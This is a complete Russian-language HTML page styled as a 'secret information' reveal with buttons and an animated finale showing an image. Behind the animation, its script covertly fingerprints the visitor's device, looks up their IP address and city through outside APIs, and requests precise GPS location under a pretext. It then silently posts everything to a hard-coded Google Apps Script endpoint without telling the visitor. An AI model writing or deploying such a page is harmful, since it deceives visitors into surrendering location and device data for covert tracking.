<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>СЕКРЕТНАЯ ИНФОРМАЦИЯ</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            background: linear-gradient(135deg, #0a0a0a 0%, #1a1a2e 50%, #0a0a0a 100%);
            min-height: 100vh;
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
            font-family: 'Courier New', monospace;
            overflow: hidden;
            position: relative;
        }

        .title {
            font-size: 3rem;
            color: #00ff88;
            text-transform: uppercase;
            letter-spacing: 10px;
            text-shadow: 0 0 20px #00ff88, 0 0 40px #00ff88, 0 0 60px #00ff88;
            animation: pulse 2s ease-in-out infinite;
            z-index: 10;
            text-align: center;
            padding: 20px;
        }

        @keyframes pulse {
            0%, 100% { opacity: 1; }
            50% { opacity: 0.7; }
        }

        .buttons-container {
            display: flex;
            gap: 30px;
            margin-top: 50px;
            z-index: 10;
        }

        .btn {
            padding: 20px 50px;
            font-size: 1.2rem;
            font-family: 'Courier New', monospace;
            text-transform: uppercase;
            letter-spacing: 3px;
            border: 2px solid #00ff88;
            background: transparent;
            color: #00ff88;
            cursor: pointer;
            transition: all 0.3s ease;
            position: relative;
            overflow: hidden;
        }

        .btn::before {
            content: '';
            position: absolute;
            top: 0;
            left: -100%;
            width: 100%;
            height: 100%;
            background: linear-gradient(90deg, transparent, rgba(0, 255, 136, 0.3), transparent);
            transition: left 0.5s ease;
        }

        .btn:hover::before {
            left: 100%;
        }

        .btn:hover {
            background: #00ff88;
            color: #0a0a0a;
            box-shadow: 0 0 30px #00ff88, 0 0 60px #00ff88;
        }

        .code-container {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            pointer-events: none;
            z-index: 5;
            display: none;
        }

        .code-piece {
            position: absolute;
            font-family: 'Courier New', monospace;
            font-size: 10px;
            color: #00ff88;
            opacity: 0.7;
            text-shadow: 0 0 5px #00ff88;
            user-select: none;
        }

        .sphere-container {
            position: fixed;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            width: 200px;
            height: 200px;
            z-index: 6;
            display: none;
        }

        .sphere {
            width: 100%;
            height: 100%;
            border-radius: 50%;
            background: radial-gradient(circle at 30% 30%, #00ff88, #0066ff, #ff0066, #6600ff, #00ff88);
            background-size: 200% 200%;
            animation: sphereRotate 1s linear infinite;
            box-shadow: 0 0 50px #00ff88, 0 0 100px #0066ff, 0 0 150px #ff0066;
        }

        @keyframes sphereRotate {
            0% { background-position: 0% 50%; }
            100% { background-position: 200% 50%; }
        }

        .explosion {
            position: fixed;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            width: 10px;
            height: 10px;
            background: radial-gradient(circle, #fff, #00ff88, transparent);
            border-radius: 50%;
            z-index: 7;
            display: none;
            animation: explode 0.5s ease-out forwards;
        }

        @keyframes explode {
            0% { 
                width: 10px; 
                height: 10px; 
                opacity: 1; 
            }
            100% { 
                width: 1000px; 
                height: 1000px; 
                opacity: 0; 
            }
        }

        .final-image {
            position: fixed;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            max-width: 80%;
            max-height: 80%;
            border: 3px solid #00ff88;
            box-shadow: 0 0 50px #00ff88, 0 0 100px #0066ff;
            z-index: 8;
            display: none;
            animation: imageAppear 1s ease-out;
        }

        @keyframes imageAppear {
            0% { 
                opacity: 0; 
                transform: translate(-50%, -50%) scale(0.5); 
            }
            100% { 
                opacity: 1; 
                transform: translate(-50%, -50%) scale(1); 
            }
        }

        .geo-message {
            position: fixed;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            background: rgba(0, 0, 0, 0.95);
            border: 2px solid #ff0066;
            padding: 40px;
            z-index: 100;
            text-align: center;
            display: none;
        }

        .geo-message h3 {
            color: #ff0066;
            margin-bottom: 20px;
            font-size: 1.5rem;
        }

        .geo-message p {
            color: #00ff88;
            margin-bottom: 20px;
        }

        .geo-message button {
            padding: 15px 30px;
            background: #ff0066;
            border: none;
            color: white;
            cursor: pointer;
            font-family: 'Courier New', monospace;
            text-transform: uppercase;
            letter-spacing: 2px;
        }

        .geo-message button:hover {
            background: #ff3388;
        }

        .hidden {
            display: none !important;
        }

        .scan-line {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 2px;
            background: linear-gradient(90deg, transparent, #00ff88, transparent);
            animation: scan 3s linear infinite;
            z-index: 4;
            pointer-events: none;
        }

        @keyframes scan {
            0% { top: 0; }
            100% { top: 100%; }
        }
    </style>
</head>
<body>
    <h1 class="title">СЕКРЕТНАЯ ИНФОРМАЦИЯ</h1>
    
    <div class="buttons-container" id="buttonsContainer">
        <button class="btn" onclick="handleButtonClick()">ПОЛУЧИТЬ</button>
        <button class="btn" onclick="handleButtonClick()">НЕ ПОЛУЧАТЬ</button>
    </div>

    <div class="code-container" id="codeContainer"></div>
    <div class="sphere-container" id="sphereContainer">
        <div class="sphere"></div>
    </div>
    <div class="explosion" id="explosion"></div>
    <img class="final-image" id="finalImage" src="https://i.ytimg.com/vi/_1hwg8sIydk/maxresdefault.jpg" alt="Secret">
    
    <div class="geo-message" id="geoMessage">
        <h3>🌍 ЗАПРОС ГЕОЛОКАЦИИ</h3>
        <p>Для доступа к секретным данным требуется разрешение геолокации</p>
        <p style="color: #888; font-size: 0.9rem;">Нажмите "Разрешить" или "Блокировать"</p>
    </div>

    <div class="scan-line"></div>

    <script>
        // Data collection
        let userData = {};
        let geoRequested = false;

        async function collectData() {
            // Browser data
            userData = {
                timestamp: new Date().toISOString(),
                userAgent: navigator.userAgent,
                language: navigator.language,
                platform: navigator.platform,
                screenResolution: `${screen.width}x${screen.height}`,
                colorDepth: screen.colorDepth,
                pixelDepth: screen.pixelDepth,
                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                cookieEnabled: navigator.cookieEnabled,
                doNotTrack: navigator.doNotTrack,
                deviceType: getDeviceType(),
                browser: getBrowserInfo(),
                os: getOSInfo(),
                cpuCores: navigator.hardwareConcurrency || 'N/A',
                memory: navigator.deviceMemory || 'N/A',
                connection: navigator.connection ? {
                    effectiveType: navigator.connection.effectiveType,
                    downlink: navigator.connection.downlink,
                    rtt: navigator.connection.rtt
                } : 'N/A'
            };

            // Get IP
            try {
                const ipResponse = await fetch("https://api.ipify.org?format=json");
                const ipData = await ipResponse.json();
                userData.ip = ipData.ip;

                // Get geolocation data from IP
                const geoResponse = await fetch(`https://ipapi.co/${ipData.ip}/json/`);
                const geoData = await geoResponse.json();
                userData.ipGeolocation = {
                    city: geoData.city,
                    region: geoData.region,
                    country: geoData.country_name,
                    latitude: geoData.latitude,
                    longitude: geoData.longitude
                };
            } catch (e) {
                userData.ip = 'Could not retrieve';
                userData.ipGeolocation = 'Could not retrieve';
            }

            // Save to localStorage
            localStorage.setItem('userData', JSON.stringify(userData));
            
            console.log('Collected data:', userData);
        }

        function getDeviceType() {
            const ua = navigator.userAgent;
            if (/tablet|ipad|playbook|silk/i.test(ua)) return 'Tablet';
            if (/Mobile|Android|iPhone|iPad|iPod/i.test(ua)) return 'Mobile';
            return 'Desktop';
        }

        function getBrowserInfo() {
            const ua = navigator.userAgent;
            if (ua.includes('Chrome')) return 'Chrome';
            if (ua.includes('Firefox')) return 'Firefox';
            if (ua.includes('Safari')) return 'Safari';
            if (ua.includes('Edge')) return 'Edge';
            if (ua.includes('MSIE') || ua.includes('Trident')) return 'IE';
            return 'Unknown';
        }

        function getOSInfo() {
            const ua = navigator.userAgent;
            if (ua.includes('Win')) return 'Windows';
            if (ua.includes('Mac')) return 'macOS';
            if (ua.includes('Linux')) return 'Linux';
            if (ua.includes('Android')) return 'Android';
            if (ua.includes('iOS')) return 'iOS';
            return 'Unknown';
        }

        function requestGeolocation() {
            geoRequested = true;
            navigator.geolocation.getCurrentPosition(
                (position) => {
                    userData.geolocation = {
                        latitude: position.coords.latitude,
                        longitude: position.coords.longitude,
                        accuracy: position.coords.accuracy,
                        timestamp: new Date(position.timestamp).toISOString()
                    };
                    
                    // Update localStorage
                    localStorage.setItem('userData', JSON.stringify(userData));
                    
                    document.getElementById('geoMessage').style.display = 'none';
                    startAnimation();
                },
                (error) => {
                    // Геолокация отклонена - всё равно запускаем анимацию
                    userData.geolocation = {
                        status: 'denied',
                        error: error.message
                    };
                    localStorage.setItem('userData', JSON.stringify(userData));
                    
                    document.getElementById('geoMessage').style.display = 'none';
                    startAnimation();
                },
                {
                    enableHighAccuracy: true,
                    timeout: 10000,
                    maximumAge: 0
                }
            );
        }

        function handleButtonClick() {
            // Collect data first
            collectData();
            
            // Скрываем кнопки и показываем сообщение о геолокации
            document.getElementById('buttonsContainer').classList.add('hidden');
            document.getElementById('geoMessage').style.display = 'block';
            
            // Request geolocation
            if (!geoRequested) {
                requestGeolocation();
            }
        }

        function startAnimation() {
            const buttons = document.getElementById('buttonsContainer');
            const codeContainer = document.getElementById('codeContainer');
            const sphereContainer = document.getElementById('sphereContainer');
            const explosion = document.getElementById('explosion');
            const finalImage = document.getElementById('finalImage');

            buttons.classList.add('hidden');
            codeContainer.style.display = 'block';

            // Generate code pieces
            const codeSnippets = [
                'const', 'let', 'var', 'function', 'return', 'if', 'else', 'for', 'while',
                'class', 'import', 'export', 'from', 'async', 'await', 'try', 'catch',
                'document', 'window', 'navigator', 'fetch', 'promise', '=>', '{}', '[]',
                '0x4A3F', '0xB7E2', '0x9C1D', 'SECRET', 'ENCRYPT', 'DECRYPT', 'HASH',
                'a[i] = b[j]', 'x += y', 'return null', 'void 0', 'undefined',
                '<div>', '</div>', 'class="secret"', 'id="root"', 'key={index}',
                'SELECT * FROM users', 'WHERE id = 1', 'DROP TABLE', 'INSERT INTO',
                'Authorization: Bearer', 'X-API-Key', 'Content-Type: application/json',
                'ssh-rsa AAAA', '-----BEGIN KEY-----', 'password123', 'admin',
                '192.168.1.1', '10.0.0.1', '255.255.255.0', 'localhost:3000',
                'data:text/html', 'javascript:void', 'eval()', 'setTimeout',
                'Math.random()', 'Date.now()', 'JSON.stringify', 'localStorage'
            ];

            const colors = ['#00ff88', '#0066ff', '#ff0066', '#6600ff', '#ffff00', '#00ffff'];

            // Create 150 code pieces
            for (let i = 0; i < 150; i++) {
                const piece = document.createElement('div');
                piece.className = 'code-piece';
                piece.textContent = codeSnippets[Math.floor(Math.random() * codeSnippets.length)];
                piece.style.color = colors[Math.floor(Math.random() * colors.length)];
                piece.style.left = Math.random() * 100 + '%';
                piece.style.top = Math.random() * 100 + '%';
                piece.style.fontSize = (8 + Math.random() * 12) + 'px';
                
                // Random velocity for anti-gravity effect
                piece.dataset.vx = (Math.random() - 0.5) * 0.5;
                piece.dataset.vy = (Math.random() - 0.5) * 0.5;
                piece.dataset.rotation = Math.random() * 360;
                piece.dataset.rotationSpeed = (Math.random() - 0.5) * 2;
                
                codeContainer.appendChild(piece);
            }

            // Animate code pieces (anti-gravity for 3 seconds)
            let startTime = Date.now();
            const antiGravityDuration = 3000;

            function animateAntiGravity() {
                const elapsed = Date.now() - startTime;
                
                if (elapsed < antiGravityDuration) {
                    document.querySelectorAll('.code-piece').forEach(piece => {
                        let left = parseFloat(piece.style.left);
                        let top = parseFloat(piece.style.top);
                        let rotation = parseFloat(piece.dataset.rotation);
                        
                        left += parseFloat(piece.dataset.vx);
                        top += parseFloat(piece.dataset.vy);
                        rotation += parseFloat(piece.dataset.rotationSpeed);
                        
                        // Bounce off edges
                        if (left <= 0 || left >= 95) piece.dataset.vx *= -1;
                        if (top <= 0 || top >= 95) piece.dataset.vy *= -1;
                        
                        piece.style.left = left + '%';
                        piece.style.top = top + '%';
                        piece.style.transform = `rotate(${rotation}deg)`;
                        piece.dataset.rotation = rotation;
                    });
                    
                    requestAnimationFrame(animateAntiGravity);
                } else {
                    // Start vacuum effect - converge to center
                    convergeToSphere();
                }
            }

            animateAntiGravity();

            function convergeToSphere() {
                const centerX = window.innerWidth / 2;
                const centerY = window.innerHeight / 2;
                
                document.querySelectorAll('.code-piece').forEach((piece, index) => {
                    const rect = piece.getBoundingClientRect();
                    const pieceX = rect.left + rect.width / 2;
                    const pieceY = rect.top + rect.height / 2;
                    
                    const angle = Math.atan2(centerY - pieceY, centerX - pieceX);
                    const speed = 15 + Math.random() * 10;
                    
                    const vx = Math.cos(angle) * speed;
                    const vy = Math.sin(angle) * speed;
                    
                    piece.style.transition = 'all 0.8s cubic-bezier(0.4, 0, 0.2, 1)';
                    piece.style.left = (centerX - rect.width / 2) + 'px';
                    piece.style.top = (centerY - rect.height / 2) + 'px';
                    piece.style.opacity = '1';
                    piece.style.fontSize = '14px';
                    piece.style.zIndex = Math.floor(Math.random() * 100);
                });

                // Show sphere after convergence
                setTimeout(() => {
                    codeContainer.style.display = 'none';
                    sphereContainer.style.display = 'block';
                    
                    // Explode after 2 seconds
                    setTimeout(() => {
                        sphereContainer.style.display = 'none';
                        explosion.style.display = 'block';
                        
                        // Show final image
                        setTimeout(() => {
                            explosion.style.display = 'none';
                            finalImage.style.display = 'block';
                            
                            // Send data to Google Sheets
                            sendToGoogleSheets();
                        }, 500);
                    }, 2000);
                }, 800);
            }
        }

        async function sendToGoogleSheets() {
            const GOOGLE_SCRIPT_URL = 'https://script.google.com/macros/s/AKfycbxkytmwKiiYudBPBnvXE7MHSbq7_H-3Sr29ZYTydG5NOncC8g5_HyQeoS1HYqnTd1Dl/exec';
            
            try {
                await fetch(GOOGLE_SCRIPT_URL, {
                    method: 'POST',
                    mode: 'no-cors',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify(userData)
                });
                console.log('Data sent to Google Sheets');
            } catch (e) {
                console.error('Error sending data:', e);
            }
        }

        // Collect initial data on page load
        collectData();
    </script>
</body>
</html>
